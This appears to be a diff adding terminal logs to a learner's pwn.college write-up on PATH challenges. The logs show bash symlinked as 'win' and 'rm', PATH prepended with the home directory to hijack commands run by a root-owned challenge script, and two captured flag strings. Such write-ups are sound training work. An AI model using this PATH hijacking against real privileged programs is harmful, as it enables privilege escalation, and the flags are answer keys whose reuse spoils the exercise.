@@ -82,7 +82,18 @@ Use read (again, refer to Shell Variables) to read /flag. Since read is a builti
 Now, go and win!
 ## Code
 ```
-
+hacker@path~adding-commands:~$ echo $PATH
+/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+hacker@path~adding-commands:~$ ln -s /usr/bin/bash ./win
+hacker@path~adding-commands:~$ PATH=/home/hacker:$PATH
+hacker@path~adding-commands:~$ /challenge/run
+Invoking 'win'....
+root@path~adding-commands:~# echo $PATH
+/home/hacker:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+root@path~adding-commands:~# touch win
+root@path~adding-commands:~# cat win
+root@path~adding-commands:~# cat /flag
+pwn.college{AIhTvGXB98FSOEfLKBenQ4ZJyo1.dZzNyUDLyUTN0czW}
 ```
 ## What I learnt
 
@@ -93,6 +104,11 @@ Armed with your knowledge, you can now carry out some shenanigans. This challeng
 How can you solve this? You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?
 ## Code
 ```
-
+hacker@path~hijacking-commands:~$ ln -s /usr/bin/bash ./rm
+hacker@path~hijacking-commands:~$ PATH=/home/hacker:$PATH
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+/flag: line 1: pwn.college{sfLsL-zDU7KDrFxwyI0RITHujsV.ddzNyUDLyUTN0czW}: command not found
 ```
 ## What I learnt
